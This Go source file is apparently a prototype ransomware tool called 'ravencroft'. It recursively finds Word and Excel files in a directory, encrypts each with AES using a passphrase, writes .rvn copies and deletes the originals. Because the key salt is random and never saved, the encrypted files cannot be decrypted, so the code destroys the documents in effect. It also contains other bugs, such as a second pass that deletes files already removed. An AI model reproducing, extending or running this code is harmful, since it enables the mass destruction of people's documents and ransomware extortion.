package main

import (
 "crypto/aes"
 "crypto/cipher"
 "crypto/rand"
 "crypto/sha256"
 "errors"
 "fmt"
 "io/ioutil"
 "os"
 "path/filepath"

 "golang.org/x/crypto/pbkdf2"
)

func main() {
 if len(os.Args) < 2 {
  println("Usage: ravencroft.exe crow <dir>")
  return
 }

 mode := os.Args[1]

 if mode == "crow" {
  if len(os.Args) != 3 {
   println("Usage: ravencroft.exe crow <directory>")
   return
  }

  directory := os.Args[2]
  files, err := crowscan(directory)
  if err != nil {
   return
  }
  fmt.Println("Found files:")
  for _, file := range files {
   fmt.Println(file)
  }
  return
 } else if mode == "raptor" {
  if len(os.Args) != 4 {
   println("Warning: ravencroft.exe raptor <directory> <passphrase>\nWill encrypt all office files in the directory.")
   return
  }
  directory := os.Args[2]
  passphrase := os.Args[3]
  //files, err := crowscan(directory)
  files, err := raptor(directory, passphrase)
  if err != nil {
   fmt.Println("Error: ", err)
  }
  cleanup((files))
 }

 if len(os.Args) < 5 {
  println("Usage: raven [encrypt/decrypt] <input> <output> <passphrase>")
  return
 }

 //mode := os.Args[1]
 inputFilename := os.Args[2]
 outputFilename := os.Args[3]
 passphrase := os.Args[4]

 data, err := ioutil.ReadFile(inputFilename)
 if err != nil {
  panic(err)
 }

 key, iv := KIVderivitive(passphrase)

 if mode == "encrypt" {

  encryptedData, err := encrypt(data, key, iv)
  if err != nil {
   panic(err)
  }

  err = ioutil.WriteFile(outputFilename, encryptedData, 0644)
  if err != nil {
   panic(err)
  }

  println("File encrypted successfully")
 } else if mode == "decrypt" {

  decryptedData, err := decrypt(data, key, iv)
  if err != nil {
   panic(err)
  }

  err = ioutil.WriteFile(outputFilename, decryptedData, 0644)
  if err != nil {
   panic(err)
  }
  println("File decryped successfully!")
 } else {
  println("Invalid mode.  Use 'encrypt' or 'decrypt'.")
 }
}

func crowscan(root string) ([]string, error) {
 var files []string
 err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
  if err != nil {
   return err
  }

  if !info.IsDir() && (filepath.Ext(path) == ".docx" || filepath.Ext(path) == ".xlsx") {
   files = append(files, path)
  }
  return nil
 })

 if err != nil {
  fmt.Printf("Error in recursive crow scan %q: %v\n", root, err)
  return nil, err
 }
 return files, err
}

func raptor(directory, passphrase string) ([]string, error) {
 files, err := crowscan(directory)
 if err != nil {
  return nil, errors.New("failed to find files")
 }

 if len(files) == 0 {
  fmt.Printf("\nNo files found to encrypt")
  return nil, errors.New("no files found to encrypt")
 }

 key, iv := KIVderivitive((passphrase))
 for _, file := range files {
  data, err := ioutil.ReadFile(file)
  if err != nil {
   fmt.Printf("\nskipping file %s due to error: %v\n", file, err)
   continue
  }

  encryptedData, err := encrypt(data, key, iv)
  if err != nil {
   fmt.Printf("\nError encrypting file %s: %v\n", file, err)
   continue
  }

  err = ioutil.WriteFile(file+".rvn", encryptedData, 0644)
  if err != nil {
   fmt.Printf("\nError writing encrypted file for %s: %v\n", file, err)
   continue
  }

  fmt.Printf("\nEncrypted file written: %s.rvn", file)
 }
 for _, file := range files {
  err := os.Remove(file)
  if err != nil {
   return nil, fmt.Errorf("failed to delete %s: %v", file, err)
  }
  fmt.Printf("\nDeleted %s successfully.\n", file)
 }
 return files, nil
}

func cleanup(files []string) error {
 for _, file := range files {
  err := os.Remove(file)
  if err != nil {
   return fmt.Errorf("\n[!] failed to delete %s %v", file, err)
  }
  fmt.Printf("\nDeleted % successfully.\n", file)
 }
 return nil
}

func KIVderivitive(passphrase string) ([]byte, []byte) {
 salt := make([]byte, 8) //temp fixed salt value
 if _, err := rand.Read(salt); err != nil {
  panic(err)
 }

 // generate a 32-bit key for AES256
 key := pbkdf2.Key([]byte(passphrase), salt, 4096, 32, sha256.New)
 iv := pbkdf2.Key([]byte(passphrase), salt, 4096, aes.BlockSize, sha256.New)
 return key[:16], iv //convert 32-byte key to 16-byte for AES128
}

func encrypt(data, key, iv []byte) ([]byte, error) {
 block, err := aes.NewCipher(key)
 if err != nil {
  return nil, err
 }

 padLen := aes.BlockSize - len(data)%aes.BlockSize
 padding := make([]byte, padLen)
 for i := range padding {
  padding[i] = byte(padLen)
 }

 data = append(data, padding...)

 cipherText := make([]byte, len(data))
 mode := cipher.NewCBCEncrypter(block, iv)
 mode.CryptBlocks(cipherText, data)

 return cipherText, nil
}

func decrypt(data, key, iv []byte) ([]byte, error) {
 block, err := aes.NewCipher(key)
 if err != nil {
  return nil, err
 }

 if len(data)%aes.BlockSize != 0 {
  return nil, errors.New("ciphertext is not a multiple of the block size")
 }

 decrypted := make([]byte, len(data))
 mode := cipher.NewCBCDecrypter(block, iv)
 mode.CryptBlocks(decrypted, data)

 paddingLen := int(decrypted[len(decrypted)-1])
 if paddingLen > len(decrypted) || paddingLen > aes.BlockSize {
  return nil, errors.New("invalid padding")
 }

 decrypted = decrypted[:len(decrypted)-paddingLen]

 return decrypted, nil
}
